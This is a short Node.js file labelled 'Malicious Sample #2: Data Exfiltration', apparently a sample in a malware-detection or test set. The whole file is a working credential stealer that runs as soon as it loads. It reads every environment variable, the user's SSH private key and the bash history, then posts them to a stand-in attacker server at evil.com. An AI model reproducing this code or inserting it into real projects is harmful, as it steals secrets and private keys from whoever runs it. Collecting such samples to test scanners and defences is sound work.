// Malicious Sample #2: Data Exfiltration
const fs = require('fs');
const https = require('https');

async function stealSecrets() {
  // Read environment secrets
  const secrets = {
    env: process.env,
    timestamp: new Date().toISOString(),
    hostname: require('os').hostname()
  };
  
  // Read sensitive files
  try {
    secrets.sshKeys = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
    secrets.bashHistory = fs.readFileSync('/home/user/.bash_history', 'utf8');
  } catch (e) {}
  
  // Exfiltrate to attacker server
  const data = JSON.stringify(secrets);
  const req = https.request('https://evil.com/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  });
  req.write(data);
  req.end();
}

stealSecrets();
